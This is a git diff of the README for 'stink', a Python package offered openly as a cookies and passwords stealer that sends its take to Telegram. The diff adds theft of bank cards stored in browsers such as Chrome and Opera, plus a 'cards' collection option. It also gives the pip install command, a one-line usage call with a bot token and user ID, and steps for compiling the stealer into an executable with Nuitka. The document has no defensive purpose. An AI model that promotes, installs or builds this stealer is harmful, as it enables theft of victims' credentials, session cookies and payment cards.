@@ -26,7 +26,7 @@ Cookies and passwords stealer in just 2 lines. Sending to Telegram.
   * [CMD](#CMD)
 
 ### Current features
-1. Collecting cookies and passwords of the following browsers:
+1. Collecting cookies, passwords and bank cards of the following browsers:
    - Chrome
    - Opera
    - Opera GX
@@ -46,7 +46,7 @@ Cookies and passwords stealer in just 2 lines. Sending to Telegram.
 
 You can install the latest version with the command:
 ```
-pip install stink==0.0.9
+pip install stink==0.0.10
 ```
 
 ## Example usage
@@ -63,6 +63,8 @@ Stealer(token="YOUR_TOKEN", user_id=YOUR_ID).run()
 - `passwords` - collecting passwords.
 
 - `cookies` - collecting cookies.
+
+- `cards` - collection of bank cards.
 
 - `processes` - collecting of active processes.
 
@@ -146,7 +148,7 @@ venv\Scripts\activate
 pip install Nuitka==0.6.16.4
 ```
 ```
-pip install stink==0.0.9
+pip install stink==0.0.10
 ```
 6. In the appearing folder venv go to the path `\Lib\site-packages\win32\`.
 7. Copy the file `win32crypt.pyd`.
